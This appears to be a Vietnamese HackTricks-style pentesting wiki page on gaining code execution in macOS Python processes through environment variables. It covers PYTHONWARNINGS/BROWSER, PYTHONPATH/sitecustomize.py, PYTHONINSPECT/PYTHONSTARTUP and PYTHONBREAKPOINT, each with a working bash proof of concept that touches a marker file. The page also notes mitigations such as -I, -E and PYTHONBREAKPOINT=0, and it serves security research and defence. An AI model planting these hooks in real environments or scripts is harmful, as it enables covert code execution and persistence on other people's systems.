# Injection vào ứng dụng Python trên macOS

{{#include ../../../banners/hacktricks-training.md}}

## Thông qua các biến môi trường `PYTHONWARNINGS` và `BROWSER`

Nếu kẻ tấn công có thể kiểm soát môi trường của một tiến trình Python, sự kết hợp giữa `PYTHONWARNINGS` và `BROWSER` có thể kích hoạt việc thực thi lệnh khi Python import module `antigravity` trong lúc xử lý một tùy chọn cảnh báo được tạo thủ công. Kỹ thuật này dựa vào việc `antigravity` mở URL bằng module `webbrowser` của Python, vốn tuân theo biến môi trường `BROWSER`.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Via `PYTHONPATH` and `sitecustomize.py`

Trong quá trình khởi động thông thường, module `site` của Python thêm các đường dẫn dành riêng cho site rồi thử import module có tên `sitecustomize`. Bằng cách đặt một thư mục mà attacker có thể đọc lên đầu `PYTHONPATH`, attacker kiểm soát môi trường của process có thể khiến Python import payload trước script mục tiêu. Cờ `-S` tắt việc tự động khởi tạo `site`, còn isolated mode (`-I`) bỏ qua `PYTHONPATH` và ngầm bật `-s` cùng `-E`.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Để duy trì quyền truy cập thông qua site người dùng có thể ghi thay vì `PYTHONPATH` được kế thừa, xem [các tệp khởi động Python `.pth`, `.start` và `usercustomize`](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Thông qua `PYTHONINSPECT` và `PYTHONSTARTUP` sau khi chạy script

Trên CPython 3.13+, script được khởi chạy với `PYTHONINSPECT=1` sẽ mở một phiên tương tác khi kết thúc. Nếu đầu vào chuẩn là terminal và có PyREPL, phiên đó sẽ thực thi tệp được chỉ định bởi `PYTHONSTARTUP` **sau khi** script mục tiêu chạy xong và trước khi hiện dấu nhắc. Vì vậy, kẻ tấn công kiểm soát cả hai biến được kế thừa và một tệp khởi động có thể đọc có thể chạy mã trong tiến trình mục tiêu mà không cần sửa script. Đây là cơ chế kích hoạt sau khi script chạy, không phải hook khởi động thông thường.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Chuỗi này không thực thi file khởi động trên các phiên bản CPython cũ hơn, khi đầu vào tiêu chuẩn không phải terminal hoặc khi `PYTHON_BASIC_REPL` buộc dùng REPL cơ bản. `-E` và `-I` bỏ qua các biến `PYTHON*`. Hãy kiểm tra trình thông dịch thực tế và ngữ cảnh terminal trước khi dựa vào cách này.<sup>[[3]](#references)[[5]](#references)</sup>

## Via `PYTHONBREAKPOINT`

Kể từ Python 3.7 (PEP 553), hàm tích hợp `breakpoint()` sẽ import và gọi bất cứ thứ gì mà `sys.breakpointhook` trỏ tới; mục tiêu đó được lấy từ biến môi trường **`PYTHONBREAKPOINT`** (`package.module.callable`). Cả việc import module được chỉ định lẫn gọi callable đều diễn ra trước khi trình gỡ lỗi thường xuất hiện, vì vậy kẻ tấn công kiểm soát môi trường của một tiến trình có gọi đến `breakpoint()` (thường gặp trong các script bảo trì/gỡ lỗi và đôi khi vẫn còn trong môi trường production) có thể thực thi mã.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Unlike `PYTHONWARNINGS`/`PYTHONPATH`, cách này yêu cầu tiến trình đích thực sự đi đến lệnh gọi `breakpoint()`, nhưng cũng hoạt động chỉ thông qua **tác dụng phụ khi import** của module được chỉ định (trỏ đến bất kỳ module nào có thể import — chẳng hạn module được đặt đầu tiên trên `PYTHONPATH` — có chạy code ở cấp cao nhất). Đặt `PYTHONBREAKPOINT=0` sẽ vô hiệu hóa hoàn toàn hook.



## References

- [1] [Hack bằng biến môi trường - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook cấu hình riêng cho từng site](https://docs.python.org/3/library/site.html)
- [3] [Python: dòng lệnh và môi trường](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — breakpoint() tích hợp sẵn và PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Điều phối REPL của trình thông dịch CPython (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Thực thi tệp khởi động PyREPL của CPython (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
